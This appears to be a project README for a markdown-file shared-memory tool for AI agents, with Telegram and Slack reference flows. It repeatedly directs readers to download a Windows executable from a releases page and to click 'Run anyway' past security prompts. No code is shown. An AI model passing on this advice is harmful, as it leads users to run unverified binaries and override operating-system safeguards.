# 🧠 icarus-daedalus - Simple shared memory for apps

[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/lethargic-meconopsis543/icarus-daedalus/releases)

## 📥 Download

Visit this page to download: https://github.com/lethargic-meconopsis543/icarus-daedalus/releases

Look for the latest release on the page. On Windows, download the `.exe` file if one is listed. If the release uses a ZIP file, download the ZIP, open it, and run the app from the extracted folder.

## 🪟 Run on Windows

1. Open the releases page.
2. Download the latest Windows file.
3. If you get a ZIP file, right-click it and choose Extract All.
4. Open the folder that was created.
5. Double-click the app file to start it.

If Windows shows a security prompt, choose Run anyway only if you downloaded the file from the releases page above.

## 🧭 What this app does

Icarus Daedalus gives your apps a shared memory layer using plain markdown files in a folder. That means different tools can read and write the same memory without a complex setup.

It is useful when you want:

- shared notes between apps
- recall across devices or tools
- a simple local memory store
- a setup that works with many platforms
- a path for one agent to pass context to another

## ✨ Main features

- Markdown-based memory files
- Shared memory in a directory you control
- Works with different app frameworks
- Works across platforms
- Two-agent reference setup
- Telegram support in the reference flow
- Slack support in the reference flow
- Cross-platform recall for shared context
- Simple file-based structure
- Easy to inspect with Notepad or any text editor

## 🧰 What you need

- Windows 10 or Windows 11
- A keyboard and mouse
- A folder with write access
- Enough disk space for a small app and memory files
- A text editor if you want to view the markdown files

## 📁 How memory files work

The app stores memory in markdown files inside a directory. Each file can hold notes, context, or messages for later use.

A basic setup may look like this:

- one folder for shared memory
- one file per topic, user, or task
- plain text that you can open and read
- a structure that other tools can use without extra steps

This keeps the memory easy to inspect and easy to move.

## ⚙️ Basic setup

1. Download the latest release from the releases page.
2. Extract the files if the download came as a ZIP.
3. Open the app or the included reference files.
4. Choose or create a memory folder.
5. Start writing markdown notes into that folder.
6. Open the same folder from another tool if you want shared recall.

## 💬 Two-agent reference setup

The repository includes a reference flow for two agents. This helps show how one agent can write memory and another can read it later.

In plain terms:

- Agent 1 saves context into markdown files
- Agent 2 reads the same files
- both agents use the same memory folder
- Telegram and Slack can act as message paths
- the result is shared recall without a large database

This is a good model if you want one assistant to pick up where another one left off.

## 📱 Telegram and Slack use

The reference implementation includes Telegram and Slack paths. These are useful if you want memory to move through common chat tools.

Typical use cases:

- send a note from Telegram into shared memory
- write a task update from Slack to the same folder
- read the same memory from another app later
- keep a trail of context in plain text

You do not need to manage a server database for this style of setup. The markdown folder stays as the source of truth.

## 🗂️ Folder structure example

A simple memory folder may contain:

- `inbox.md` for new notes
- `tasks.md` for active work
- `history.md` for past context
- `shared.md` for memory used by more than one agent
- `users.md` for user-specific notes

You can rename these files to fit your own workflow. The app works best when the names stay clear and easy to read.

## 🔍 How to check it is working

After setup, open the memory folder and confirm that new markdown files appear.

You should be able to:

- create a note in one file
- close the app
- open the same file in Notepad
- see the same content
- use the same folder from another tool

If the files appear and the text stays readable, the shared memory layer is working.

## 🖥️ Windows tips

- Keep the memory folder in a simple location, such as Documents
- Avoid using folder names with special characters
- Use a short path if you can
- If you move the app, keep the memory folder path the same
- Back up the folder if you want to keep your memory history

## 🔐 File safety

Since the memory lives in markdown files, you control the data directly. If you want to protect it, use standard Windows folder permissions or store it in a private directory.

Good habits:

- keep backups
- use clear file names
- avoid editing the same file from two tools at once
- save changes before switching apps

## 🧪 Example use cases

- A personal assistant that keeps notes between sessions
- A support workflow that stores case context in markdown
- A Telegram bot that passes updates into shared memory
- A Slack-based team helper that writes task context to files
- A cross-platform agent that reads the same notes on Windows, Linux, or macOS

## 🛠️ Troubleshooting

### The app does not open

- Check that the download finished
- Extract the ZIP before opening the app
- Try running the file again
- Make sure Windows did not block the file

### I cannot find the memory files

- Look in the folder you selected during setup
- Search for `.md` files
- Check Documents, Downloads, or the app folder

### Changes do not show up

- Make sure you saved the markdown file
- Refresh the folder view
- Close and reopen the app
- Confirm that both tools use the same memory folder

### Telegram or Slack does not connect

- Check your account settings
- Confirm the bot or app token is correct
- Make sure the service can access the shared folder
- Restart the app after changing the settings

## 🧾 File format notes

The app uses markdown, so the memory stays readable in plain text. You can use:

- headings
- bullet lists
- short notes
- time stamps
- links
- simple tags

This makes it easy to scan memory by eye and easy for other tools to parse.

## 🔄 Cross-platform recall

Because the memory lives in markdown files, you can move the folder to another system and keep reading the same notes. That helps when you want one memory store across Windows and other platforms.

This works well for:

- local assistants
- hybrid desktop workflows
- shared team memory
- repeated tasks that need the same context

## 📌 Release download link

Visit this page to download: https://github.com/lethargic-meconopsis543/icarus-daedalus/releases

Use the latest release file for Windows, then extract it if needed and run the app from the downloaded folder